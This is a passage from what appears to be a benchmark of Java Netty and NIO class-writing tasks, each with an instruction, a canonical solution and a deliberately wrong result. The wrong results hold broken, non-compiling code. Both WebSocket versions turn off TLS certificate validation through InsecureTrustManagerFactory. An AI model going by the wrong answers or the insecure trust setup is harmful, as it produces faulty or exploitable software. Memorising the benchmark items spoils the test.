URI(mUri);\n        int port = validateURIAndGetPort(uri);\n        String scheme = uri.getScheme();\n        String host = uri.getHost();\n\n        final SslContext sslContext = getSSLContext(scheme);\n\n        WebSocketClientHandshaker handshaker = WebSocketClientHandshakerFactory.newHandshaker(\n                uri, WebSocketVersion.V13, null, true,\n                new DefaultHttpHeaders(), options.getMaxFramePayloadSize());\n        mHandler = new NettyWebSocketClientHandler(handshaker, this, transportHandler);\n\n        mGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) throws Exception {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        if (sslContext != null) {\n                            pipeline.addLast(sslContext.newHandler(ch.alloc(), host, port));\n                        }\n                        pipeline.addLast(\n                                new HttpClientCodec(),\n                                new HttpObjectAggregator(8192),\n                                new IdleStateHandler(\n                                        options.getAutoPingInterval() + options.getAutoPingTimeout(),\n                                        options.getAutoPingInterval(), 0, TimeUnit.SECONDS),\n                                mHandler);\n                    }\n                });\n\n        ChannelFuture f = bootstrap.connect(uri.getHost(), port);\n        f.addListener((ChannelFutureListener) connectFuture -> {\n            if (connectFuture.cause() != null) {\n                transportHandler.onDisconnect(false);\n            } else {\n                mChannel = f.channel();\n            }\n        });\n    }\n\n    @Override\n    public void send(byte[] payload, boolean isBinary) {\n        WebSocketFrame frame = isBinary ?\n                new BinaryWebSocketFrame(toByteBuf(payload)) :\n                new TextWebSocketFrame(toByteBuf(payload));\n        mChannel.writeAndFlush(frame);\n    }\n\n    @Override\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isOpen();\n    }\n\n    @Override\n    public void close() throws Exception {\n        if (mHandler != null && mChannel != null) {\n            mHandler.close(mChannel, true, new CloseDetails(CloseDetails.REASON_DEFAULT, null));\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully().sync();\n            mGroup = null;\n        }\n    }\n\n    private int validateURIAndGetPort(URI uri) {\n        String scheme = uri.getScheme();\n        if (!\"ws\".equalsIgnoreCase(scheme) && !\"wss\".equalsIgnoreCase(scheme)) {\n            throw new IllegalArgumentException(\"Only WS(S) is supported.\");\n        }\n        int port = uri.getPort();\n        if (port == -1) {\n            port = \"ws\".equalsIgnoreCase(scheme) ? 80 : 443;\n        }\n        return port;\n    }\n\n    private SslContext getSSLContext(String scheme) throws SSLException {\n        return \"wss\".equalsIgnoreCase(scheme) ?\n                SslContextBuilder.forClient().trustManager(InsecureTrustManagerFactory.INSTANCE).build() :\n                null;\n    }\n\n    private ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.copiedBuffer(bytes);\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyWebSocket {\n    private Channel mChannel;\n    private NettyWebSocketClientHandler mHandler;\n    private NioEventLoopGroup mGroup;\n    private String mUri;\n    private WebSocketOptions mOptions;\n\n    public void connect(ITransportHandler transportHandler, TransportOptions options) throws Exception {\n        mOptions = options;\n        mUri = options.getUri();\n        int port = validateURIAndGetPort(new URI(mUri));\n        mGroup = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(mGroup)\n                .channel(NioSocketChannel.class)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    public void initChannel(SocketChannel ch) {\n                        ChannelPipeline pipeline = ch.pipeline();\n                        SslContext sslContext = getSSLContext(mUri.startsWith(\"wss\"));\n                        if (sslContext != null) {\n                            pipeline.addLast(sslContext.newHandler(ch.alloc()));\n                        }\n                        pipeline.addLast(new HttpEncoder());\n                        pipeline.addLast(new HttpDecoder());\n                        pipeline.addLast(new WebSocketClientHandshaker(new WebSocketClientHandshakerFactory()\n                                .newHandshaker(new WebSocketClientHandshakeRequest(mUri, \"WebSocket\")));\n                        pipeline.addLast(mHandler = new NettyWebSocketClientHandler(transportHandler));\n                    }\n                });\n        ChannelFuture future = bootstrap.connect(mUri.getHost(), port).sync();\n        mChannel = future.channel();\n        future.channel().closeFuture().sync();\n    }\n\n    public void send(byte[] payload, boolean isBinary) {\n        if (mChannel.isActive()) {\n            ByteBuf buf = toByteBuf(payload);\n            if (isBinary) {\n                mChannel.writeAndFlush(new DefaultWebSocketFrame(buf));\n            } else {\n                mChannel.writeAndFlush(new TextWebSocketFrame(buf));\n            }\n        }\n    }\n\n    public boolean isOpen() {\n        return mChannel != null && mChannel.isActive();\n    }\n\n    public void close() throws Exception {\n        if (mChannel != null && mChannel.isActive()) {\n            mChannel.close().sync();\n        }\n        if (mGroup != null) {\n            mGroup.shutdownGracefully().sync();\n        }\n    }\n\n    public int validateURIAndGetPort(URI uri) {\n        if (!uri.getScheme().equals(\"ws\") && !uri.getScheme().equals(\"wss\")) {\n            throw new IllegalArgumentException(\"Unsupported scheme: \" + uri.getScheme());\n        }\n        int port = uri.getPort();\n        if (port == -1) {\n            port = \"wss\".equals(uri.getScheme()) ? 443 : 80;\n        }\n        return port;\n    }\n\n    public SslContext getSSLContext(boolean isSecure) {\n        if (!isSecure) {\n            return null;\n        }\n        return SslContextBuilder.forClient()\n                .trustManager(InsecureTrustManagerFactory.INSTANCE)\n                .build();\n    }\n\n    public ByteBuf toByteBuf(byte[] bytes) {\n        return Unpooled.wrappedBuffer(bytes);\n    }\n}"
  },
  {
    "Task_id": 125,
    "Instruction": "Task Description: Create a Java class that manages TCP client connections using Netty framework, handling connection establishment, error handling, and resource cleanup.\n\nClass Description: NetService is a connection management class that maintains and reuses TCP connections to remote locations using Netty's non-blocking I/O. It provides thread-safe connection pooling and handles connection lifecycle including handshake, authentication, and graceful shutdown.\n\nAttributes:\n- connections: ConcurrentHashMap<Location, Connection> - Thread-safe map storing active connections keyed by remote location\n\nMethods:\n- connect(Location location) -> Connection - Establishes or reuses a TCP connection to the specified location. Handles connection initialization, handshake, and authentication. Returns the established connection.\n  Input: \n    - location: Location - The remote endpoint to connect to\n  Output: \n    - Connection - The established or existing connection object\n\nThe implementation should:\n1. Use Netty's Bootstrap for client configuration\n2. Employ NioEventLoopGroup for I/O thread management\n3. Configure TCP_NODELAY for low-latency communication\n4. Handle connection errors and interruptions\n5. Implement connection pooling with automatic cleanup\n6. Support connection handshake and authentication\n7. Provide graceful shutdown of resources\n8. Maintain thread safety through ConcurrentHashMap",
    "Canonical_solution": "import io.dingodb.common.Location;\nimport io.dingodb.net.NetError;\nimport io.dingodb.net.netty.Constant;\nimport io.dingodb.net.netty.connection.Connection;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport lombok.extern.slf4j.Slf4j;\n\nimport java.util.Map;\nimport java.util.concurrent.ConcurrentHashMap;\n\nimport static io.dingodb.common.concurrent.Executors.executor;\nimport static io.dingodb.common.util.Optional.ifPresent;\n\n@Slf4j\npublic class NetService {\n\n    private final Map<Location, Connection> connections = new ConcurrentHashMap<>(8);\n\n    private Connection connect(Location location) {\n        return connections.computeIfAbsent(location, k -> {\n            Optional<Connection> connection = Optional.empty();\n            NioEventLoopGroup executor = new NioEventLoopGroup(0, executor(location.url() + \"/connection\"));\n            try {\n                Bootstrap bootstrap = new Bootstrap();\n                bootstrap\n                    .channel(NioSocketChannel.class)\n                    .group(executor)\n                    .option(ChannelOption.TCP_NODELAY, true)\n                    .remoteAddress(location.toSocketAddress())\n                    .handler(new ChannelInitializer<SocketChannel>() {\n                        @Override\n                        protected void initChannel(SocketChannel ch) {\n                            connection.ifAbsentSet(new Connection(Constant.CLIENT, location, ch));\n                            NettyHandlers.initChannelPipeline(ch, connection.get());\n                        }\n                    });\n                bootstrap.connect().sync().await();\n                connection\n                    .ifPresent(Connection::handshake).ifPresent(Connection::auth)\n                    .ifPresent(() -> log.info(\"Connection open, remote: [{}].\", location))\n                    .orElseThrow(() -> new NullPointerException(\"connection\"));\n            } catch (InterruptedException e) {\n                log.error(\"Open connection to [{}] interrupted.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                NetError.OPEN_CONNECTION_INTERRUPT.throwFormatError(location);\n            } catch (Exception e) {\n                log.error(\"Open connection to [{}] error.\", location, e);\n                connection.ifPresent(Connection::close);\n                executor.shutdownGracefully();\n                throw e;\n            }\n            connection.get().addCloseListener(__ -> executor.shutdownGracefully());\n            connection.ifPresent(__ -> __.addCloseListener(___ -> connections.remove(location, __)));\n            connection.ifPresent(__ -> __.socket().closeFuture().addListener(ignore -> __.close()));\n            return connection.get();\n        });\n    }\n\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NetService {\n    private final Bootstrap bootstrap;\n    private final NioEventLoopGroup group;\n    private final ConcurrentHashMap<Location, Connection> connections = new ConcurrentHashMap<>();\n\n    public NetService() {\n        group = new NioEventLoopGroup();\n        bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(new ChannelInitializer<SocketChannel>() {\n                    @Override\n                    protected void initChannel(SocketChannel ch) {\n                        ch.pipeline().addLast(new HandshakeHandler());\n                        ch.pipeline().addLast(new AuthHandler());\n                    }\n                });\n    }\n\n    public Connection connect(Location location) {\n        Connection existing = connections.get(location);\n        if (existing != null && existing.isActive()) {\n            return existing;\n        }\n\n        ChannelFuture future = bootstrap.connect(location.getHost(), location.getPort()).syncUninterruptibly();\n\n        if (!future.isSuccess()) {\n            future.cause().printStackTrace();\n            future.channel().close();\n            return null;\n        }\n\n        Channel channel = future.channel();\n        future.channel().closeFuture().addListener(f -> {\n            connections.remove(location);\n        });\n\n        Connection connection = new Connection(channel);\n        connections.put(location, connection);\n        return connection;\n    }\n\n    public void shutdown() {\n        connections.values().forEach(Connection::close);\n        group.shutdownGracefully();\n    }\n\n    private class HandshakeHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelActive(ChannelHandlerContext ctx) {\n            ctx.writeAndFlush(new HandshakeMessage());\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private class AuthHandler extends ChannelInboundHandlerAdapter {\n        @Override\n        public void channelRead(ChannelHandlerContext ctx, Object msg) {\n            if (msg instanceof AuthResponse) {\n                // Authentication successful\n            } else {\n                // Authentication failed\n                ctx.close();\n            }\n        }\n\n        @Override\n        public void exceptionCaught(ChannelHandlerContext ctx, Throwable cause) {\n            cause.printStackTrace();\n            ctx.close();\n        }\n    }\n\n    private class Connection {\n        private final Channel channel;\n        private boolean active = true;\n\n        public Connection(Channel channel) {\n            this.channel = channel;\n        }\n\n        public boolean isActive() {\n            return active;\n        }\n\n        public void close() {\n            if (channel.isActive()) {\n                channel.close();\n                active = false;\n            }\n        }\n    }\n}"
  },
  {
    "Task_id": 127,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework for establishing non-blocking network connections to a remote server.\n\nClass Description: The NettyTcpClient class provides functionality to create and manage TCP client connections using Netty's asynchronous event-driven network framework. It handles connection establishment, pipeline configuration, and resource cleanup.\n\nAttributes:\n- eventLoopGroup: [NioEventLoopGroup] - Manages the event processing threads for the client\n- bootstrap: [Bootstrap] - The main configuration object for the Netty client\n\nMethods:\n- NettyTcpClient(): [Constructor] -> [void] - Initializes the client with a new NioEventLoopGroup and Bootstrap instance\n- configureBootstrap(): [void]() -> [void] - Configures the bootstrap with channel type and event loop group\n- connect(int port, String host, Consumer<Connection> handler): [ChannelFuture](int, String, Consumer<Connection>) -> [ChannelFuture] - Establishes a connection to the specified host and port, allowing for pipeline configuration via the handler\n- shutdown(): [void]() -> [void] - Shuts down the event loop group gracefully to release resources\n\nNested Class:\n- Connection: [static class] - Represents an established connection with channel and HTTP/2 components\n  Attributes:\n    - channel: [Channel] - The network channel\n    - context: [ChannelHandlerContext] - The handler context\n    - connection: [Http2Connection] - HTTP/2 connection object\n    - encoder: [Http2ConnectionEncoder] - HTTP/2 encoder\n    - decoder: [Http2ConnectionDecoder] - HTTP/2 decoder\n  Methods:\n    - Connection(ChannelHandlerContext, Http2Connection, Http2ConnectionEncoder, Http2ConnectionDecoder): [Constructor] -> [void] - Creates a new connection instance\n    - nextStreamId(): [int]() -> [int] - Gets the next available stream ID for HTTP/2 communication",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelInitializer;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport java.net.InetSocketAddress;\nimport java.util.function.Consumer;\n\npublic class NettyTcpClient {\n\n    private final NioEventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.channel(NioSocketChannel.class)\n                .group(eventLoopGroup);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        bootstrap.handler(new ChannelInitializer<Channel>() {\n            @Override\n            protected void initChannel(Channel ch) throws Exception {\n                // Configure client pipeline here\n                // Add encoders, decoders and custom handlers\n            }\n        });\n        return bootstrap.connect(new InetSocketAddress(host, port));\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        public final Channel channel;\n        public final ChannelHandlerContext context;\n        public final Http2Connection connection;\n        public final Http2ConnectionEncoder encoder;\n        public final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, \n                         Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.channel = context.channel();\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n        }\n\n        public int nextStreamId() {\n            return connection.local().incrementAndGetNextStreamId();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class NettyTcpClient {\n    private final NioEventLoopGroup eventLoopGroup;\n    private final Bootstrap bootstrap;\n\n    public NettyTcpClient() {\n        this.eventLoopGroup = new NioEventLoopGroup();\n        this.bootstrap = new Bootstrap();\n        configureBootstrap();\n    }\n\n    private void configureBootstrap() {\n        bootstrap.group(eventLoopGroup)\n                 .channel(NioSocketChannel.class)\n                 .option(ChannelOption.CONNECT_TIMEOUT_MILLIS, 5000)\n                 .option(ChannelOption.SO_KEEPALIVE, true);\n    }\n\n    public ChannelFuture connect(int port, String host, Consumer<Connection> handler) {\n        return bootstrap.connect(host, port).addListener(future -> {\n            if (future.isSuccess()) {\n                Channel channel = future.channel();\n                ChannelHandlerContext context = channel.pipeline().firstContext();\n                Http2ConnectionHandler handlerInstance = (Http2ConnectionHandler) channel.pipeline().get(Http2ConnectionHandler.class);\n                Http2Connection connection = handlerInstance.connection();\n                Http2ConnectionEncoder encoder = handlerInstance.encoder();\n                Http2ConnectionDecoder decoder = handlerInstance.decoder();\n                Connection conn = new Connection(context, connection, encoder, decoder);\n                handler.accept(conn);\n            }\n        });\n    }\n\n    public void shutdown() {\n        eventLoopGroup.shutdownGracefully();\n    }\n\n    public static class Connection {\n        private final Channel channel;\n        private final ChannelHandlerContext context;\n        private final Http2Connection connection;\n        private final Http2ConnectionEncoder encoder;\n        private final Http2ConnectionDecoder decoder;\n\n        public Connection(ChannelHandlerContext context, Http2Connection connection, Http2ConnectionEncoder encoder, Http2ConnectionDecoder decoder) {\n            this.context = context;\n            this.connection = connection;\n            this.encoder = encoder;\n            this.decoder = decoder;\n            this.channel = context.channel();\n        }\n\n        public int nextStreamId() {\n            return connection.nextAvailableStreamId();\n        }\n    }\n}"
  },
  {
    "Task_id": 128,
    "Instruction": "Task Description: Create a Java class that implements a TCP client using Netty framework to establish non-blocking connections to a remote server, handle message processing through a configurable pipeline, and ensure proper resource cleanup.\n\nClass Description: The MocoClient class provides a reusable TCP client implementation using Netty's non-blocking I/O capabilities. It manages connection lifecycle, channel configuration, and graceful shutdown of network resources.\n\nAttributes:\n- None (This is a stateless client implementation where all configuration is passed through method parameters)\n\nMethods:\n- run(String host, int port, ChannelHandler pipelineFactory) -> void - Main method that initializes and runs the Netty client. It takes the server host address, port number, and a pipeline factory for configuring message handlers. The method establishes the connection, waits for it to close, and ensures proper resource cleanup. Throws MocoException if interrupted during operation.\n\nThe method performs these key operations:\n1. Creates NioEventLoopGroup for I/O thread management\n2. Configures Bootstrap with NioSocketChannel and connection parameters\n3. Sets TCP_NODELAY option for low-latency communication\n4. Applies the provided pipeline factory for message handling\n5. Establishes connection and waits for channel closure\n6. Implements graceful shutdown in finally block",
    "Canonical_solution": "import com.github.dreamhead.moco.MocoException;\nimport io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.Channel;\nimport io.netty.channel.ChannelFuture;\nimport io.netty.channel.ChannelFutureListener;\nimport io.netty.channel.ChannelHandler;\nimport io.netty.channel.ChannelOption;\nimport io.netty.channel.EventLoopGroup;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.nio.NioSocketChannel;\n\npublic class MocoClient {\n    public final void run(final String host, final int port, final ChannelHandler pipelineFactory) {\n        EventLoopGroup group = new NioEventLoopGroup();\n        Bootstrap bootstrap = new Bootstrap();\n        bootstrap.group(group)\n                .channel(NioSocketChannel.class)\n                .remoteAddress(host, port)\n                .option(ChannelOption.TCP_NODELAY, true)\n                .handler(pipelineFactory);\n\n        try {\n            Channel channel = bootstrap.connect().sync().channel();\n            ChannelFuture future = channel.closeFuture().sync();\n            future.addListener(ChannelFutureListener.CLOSE);\n        } catch (InterruptedException e) {\n            throw new MocoException(e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 3,
    "wrong_result": "public class MocoClient {\n    public void run(String host, int port, ChannelHandler pipelineFactory) throws MocoException {\n        EventLoopGroup group = new NioEventLoopGroup();\n        try {\n            Bootstrap bootstrap = new Bootstrap();\n            bootstrap.group(group)\n                     .channel(NioSocketChannel.class)\n                     .option(ChannelOption.TCP_NODELAY, true)\n                     .handler(pipelineFactory);\n            ChannelFuture future = bootstrap.connect(new InetSocketAddress(host, port)).sync();\n            future.channel().closeFuture().await();\n        } catch (InterruptedException e) {\n            Thread.currentThread().interrupt();\n            throw new MocoException(\"Interrupted during operation\", e);\n        } finally {\n            group.shutdownGracefully();\n        }\n    }\n}"
  },
  {
    "Task_id": 13,
    "Instruction": "Task Description: Implement a Java class that reads and processes PMTiles archives, providing access to individual tiles and their metadata using Java NIO's FileChannel for efficient file operations.\n\nClass Description: ReadablePmtiles is a concrete implementation of the ReadableTileArchive interface that enables reading and navigating through a PMTiles archive format. It uses FileChannel for efficient random access to file contents and handles compressed directory structures within the archive.\n\nAttributes:\n- channel: [SeekableByteChannel] - The underlying byte channel for reading the PMTiles file\n- header: [Pmtiles.Header] - The parsed header information from the PMTiles archive\n\nMethods:\n- newReadFromFile: [static](Path path) -> [ReadableTileArchive] - Static factory method that creates a new instance by opening a file channel to the specified path\n- getTile: [int x, int y, int z] -> [byte[]] - Retrieves the tile data at the specified coordinates (x,y,z) or returns null if not found\n- close: [] -> [void] - Closes the underlying file channel and releases system resources\n- getAllTiles: [] -> [CloseableIterator<Tile>] - Returns an iterator over all tiles in the archive\n- getBytes: [private](long start, int length) -> [byte[]] - Internal method to read bytes from the channel at specified position\n- readDir: [private](long offset, int length) -> [List<Pmtiles.Entry>] - Reads and parses a directory from the archive\n- getTiles: [private](List<Pmtiles.Entry> dir) -> [Stream<Tile>] - Converts directory entries into a stream of tiles",
    "Canonical_solution": "import com.onthegomap.planetiler.archive.ReadableTileArchive;\nimport com.onthegomap.planetiler.archive.Tile;\nimport com.onthegomap.planetiler.archive.TileArchiveMetadata;\nimport com.onthegomap.planetiler.archive.TileCompression;\nimport com.onthegomap.planetiler.geo.TileCoord;\nimport com.onthegomap.planetiler.util.CloseableIterator;\nimport com.onthegomap.planetiler.util.Gzip;\nimport java.io.IOException;\nimport java.io.UncheckedIOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Path;\nimport java.nio.file.StandardOpenOption;\nimport java.util.LinkedHashMap;\nimport java.util.List;\nimport java.util.stream.IntStream;\nimport java.util.stream.Stream;\nimport org.locationtech.jts.geom.Coordinate;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n  private final SeekableByteChannel channel;\n  private final Pmtiles.Header header;\n\n  public ReadablePmtiles(SeekableByteChannel channel) throws IOException {\n    this.channel = channel;\n    this.header = Pmtiles.Header.fromBytes(getBytes(0, Pmtiles.HEADER_LEN));\n  }\n\n  public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n    return new ReadablePmtiles(FileChannel.open(path, StandardOpenOption.READ));\n  }\n\n  private synchronized byte[] getBytes(long start, int length) throws IOException {\n    channel.position(start);\n    var buf = ByteBuffer.allocate(length);\n    channel.read(buf);\n    return buf.array();\n  }\n\n  @Override\n  @SuppressWarnings(\"java:S1168\")\n  public byte[] getTile(int x, int y, int z) {\n    try {\n      var tileId = TileCoord.ofXYZ(x, y, z).hilbertEncoded();\n      long dirOffset = header.rootDirOffset();\n      int dirLength = (int) header.rootDirLength();\n\n      for (int depth = 0; depth <= 3; depth++) {\n        byte[] dirBytes = getBytes(dirOffset, dirLength);\n        if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n          dirBytes = Gzip.gunzip(dirBytes);\n        }\n\n        var dir = Pmtiles.directoryFromBytes(dirBytes);\n        var entry = findTile(dir, tileId);\n        if (entry != null) {\n          if (entry.runLength() > 0) {\n            return getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          } else {\n            dirOffset = header.leafDirectoriesOffset() + entry.offset();\n            dirLength = entry.length();\n          }\n        } else {\n          return null;\n        }\n      }\n    } catch (IOException e) {\n      throw new IllegalStateException(\"Could not get tile\", e);\n    }\n    return null;\n  }\n\n  @Override\n  public void close() throws IOException {\n    channel.close();\n  }\n\n  private List<Pmtiles.Entry> readDir(long offset, int length) {\n    try {\n      var buf = getBytes(offset, length);\n      if (header.internalCompression() == Pmtiles.Compression.GZIP) {\n        buf = Gzip.gunzip(buf);\n      }\n      return Pmtiles.directoryFromBytes(buf);\n    } catch (IOException e) {\n      throw new UncheckedIOException(e);\n    }\n  }\n\n  @Override\n  public CloseableIterator<Tile> getAllTiles() {\n    List<Pmtiles.Entry> rootDir = readDir(header.rootDirOffset(), (int) header.rootDirLength());\n    return CloseableIterator.of(getTiles(rootDir));\n  }\n\n  private Stream<Tile> getTiles(List<Pmtiles.Entry> dir) {\n    return dir.stream().mapMulti((entry, next) -> {\n      try {\n        if (entry.runLength == 0) {\n          getTiles(readDir(header.leafDirectoriesOffset() + entry.offset(), entry.length())).forEach(next);\n        } else {\n          var data = getBytes(header.tileDataOffset() + entry.offset(), entry.length());\n          for (int i = 0; i < entry.runLength(); i++) {\n            next.accept(new Tile(TileCoord.hilbertDecode((int) (entry.tileId() + i)), data));\n          }\n        }\n      } catch (IOException e) {\n        throw new IllegalStateException(\"Failed to iterate through pmtiles archive \", e);\n      }\n    });\n  }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 9,
    "wrong_result": "import java.io.IOException;\nimport java.nio.ByteBuffer;\nimport java.nio.channels.FileChannel;\nimport java.nio.channels.SeekableByteChannel;\nimport java.nio.file.Files;\nimport java.nio.file.Path;\nimport java.util.ArrayList;\nimport java.util.List;\nimport java.util.stream.Collectors;\nimport java.util.stream.Stream;\nimport java.util.Iterator;\nimport java.util.NoSuchElementException;\nimport java.util.concurrent.atomic.AtomicReference;\n\npublic class ReadablePmtiles implements ReadableTileArchive {\n    private final SeekableByteChannel channel;\n    private final Pmtiles.Header header;\n\n    private ReadablePmtiles(SeekableByteChannel channel, Pmtiles.Header header) throws IOException {\n        this.channel = channel;\n        this.header = header;\n    }\n\n    public static ReadableTileArchive newReadFromFile(Path path) throws IOException {\n        try (SeekableByteChannel channel = Files.newByteChannel(path)) {\n            ByteBuffer buffer = ByteBuffer.allocate(128);\n            int bytesRead = channel.read(buffer);\n            if (bytesRead < 128) throw new IOException(\"Incomplete header\");\n            buffer.flip();\n            Pmtiles.Header header = Pmtiles.Header.parse(buffer);\n            return new ReadablePmtiles(channel, header);\n        }\n    }\n\n    @Override\n    public byte[] getTile(int x, int y, int z) throws IOException {\n        String key = String.format(\"%d/%d/%d\", x, y, z);\n        List<Pmtiles.Entry> entries = readDir(header.directoryOffset, header.directoryLength);\n        for (Pmtiles.Entry entry : entries) {\n            if (entry.key.equals(key)) {\n                return getBytes(entry.offset, entry.size);\n            }\n        }\n        return null;\n    }\n\n    @Override\n    public void close() throws IOException {\n        channel.close();\n    }\n\n    @Override\n    public CloseableIterator<Tile> getAllTiles() {\n        List<Pmtiles.Entry> entries = readDir(header.directoryOffset, header.directoryLength);\n        return new CloseableIterator<Tile>() {\n            private final Iterator<Pmtiles.Entry> entryIterator = entries.iterator();\n            private Tile currentTile;\n\n            @Override\n            public boolean hasNext() {\n                while (entryIterator.hasNext()) {\n                    Pmtiles.Entry entry = entryIterator.next();\n                    String[] parts = entry.key.split(\"/\");\n                    if (parts.length == 3) {\n                        try {\n                            int x = Integer.parseInt(parts[0]);\n                            int y = Integer.parseInt(parts[1]);\n                            int z = Integer.parseInt(parts[2]);\n                            currentTile = new Tile(x, y, z, getBytes(entry.offset, entry.size));\n                            return true;\n                        } catch (NumberFormatException e) {\n                            // Skip invalid entries\n                        }\n                    }\n                }\n                return false;\n            }\n\n            @Override\n            public Tile next() {\n                if (!hasNext()) throw new NoSuchElementException();\n                Tile tile = currentTile;\n                currentTile = null;\n                return tile;\n            }\n\n            @Override\n            public void close() {\n                // No resources to close\n            }\n        };\n    }\n\n    private byte[] getBytes(long start, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.position(start);\n        int bytesRead = channel.read(buffer);\n        if (bytesRead < length) throw new IOException(\"Incomplete data\");\n        return buffer.array();\n    }\n\n    private List<Pmtiles.Entry> readDir(long offset, int length) throws IOException {\n        ByteBuffer buffer = ByteBuffer.allocate(length);\n        channel.position(offset);\n        int bytesRead = channel.read(buffer);\n        if (bytesRead < length) throw new IOException(\"Incomplete directory\");\n        buffer.flip();\n        return Pmtiles.Directory.parse(buffer);\n    }\n\n    private Stream<Tile> getTiles(List<Pmtiles.Entry> dir) {\n        return dir.stream()\n                .map(entry -> {\n                    String[] parts = entry.key.split(\"/\");\n                    if (parts.length == 3) {\n                        try {\n                            int x = Integer.parseInt(parts[0]);\n                            int y = Integer.parseInt(parts[1]);\n                            int z = Integer.parseInt(parts[2]);\n                            return new Tile(x, y, z, getBytes(entry.offset, entry.size));\n                        } catch (NumberFormatException e) {\n                            return null;\n                        }\n                    }\n                    return null;\n                })\n                .filter(tile -> tile != null);\n    }\n}"
  },
  {
    "Task_id": 130,
    "Instruction": "Task Description: Create a Java class that implements a Redis client using Netty framework for TCP communication, capable of sending Redis commands and receiving responses.\n\nClass Description: The RedisClient class establishes a non-blocking TCP connection to a Redis server using Netty's NIO framework. It handles command input from the user, sends commands to the Redis server, and manages connection lifecycle including graceful shutdown.\n\nAttributes:\n- HOST: [String] - The Redis server host address (default: \"127.0.0.1\")\n- PORT: [int] - The Redis server port number (default: 6379)\n- group: [EventLoopGroup] - Manages client-side I/O threads\n- channel: [Channel] - The active network channel for communication\n- lastWriteFuture: [ChannelFuture] - Tracks the last write operation to the server\n\nMethods:\n- start(): [void] - Initializes the Netty client, establishes connection to Redis server, and starts command input loop\n- stop(): [void] - Closes the connection and shuts down the client gracefully\n- initChannel(SocketChannel ch): [void] - Configures the channel pipeline with Redis codecs and handlers (internal method)",
    "Canonical_solution": "import io.netty.bootstrap.Bootstrap;\nimport io.netty.channel.*;\nimport io.netty.channel.nio.NioEventLoopGroup;\nimport io.netty.channel.socket.SocketChannel;\nimport io.netty.channel.socket.nio.NioSocketChannel;\nimport io.netty.handler.codec.redis.RedisArrayAggregator;\nimport io.netty.handler.codec.redis.RedisBulkStringAggregator;\nimport io.netty.handler.codec.redis.RedisDecoder;\nimport io.netty.handler.codec.redis.RedisEncoder;\nimport io.netty.util.concurrent.GenericFutureListener;\n\nimport java.io.BufferedReader;\nimport java.io.InputStreamReader;\n\npublic class RedisClient {\n    private static final String HOST = System.getProperty(\"host\", \"127.0.0.1\");\n    private static final int PORT = Integer.parseInt(System.getProperty(\"port\", \"6379\"));\n\n    private EventLoopGroup group;\n    private Channel channel;\n    private ChannelFuture lastWriteFuture;\n\n    public void start() throws Exception {\n        group = new NioEventLoopGroup();\n        try {\n            Bootstrap b = new Bootstrap();\n            b.group(group)\n             .channel(NioSocketChannel.class)\n             .handler(new ChannelInitializer<SocketChannel>() {\n                 @Override\n                 protected void initChannel(SocketChannel ch) throws Exception {\n                     ChannelPipeline p = ch.pipeline();\n                     p.addLast(new RedisDecoder());\n                     p.addLast(new RedisBulkStringAggregator());\n                     p.addLast(new RedisArrayAggregator());\n                     p.addLast(new RedisEncoder());\n                     p.addLast(new RedisClientHandler());\n                 }\n             });\n\n            channel = b.connect(HOST, PORT).sync().channel();\n\n            System.out.println(\"Enter Redis commands (quit to end)\");\n            BufferedReader in = new BufferedReader(new InputStreamReader(System.in));\n            for (;;) {\n                final String input = 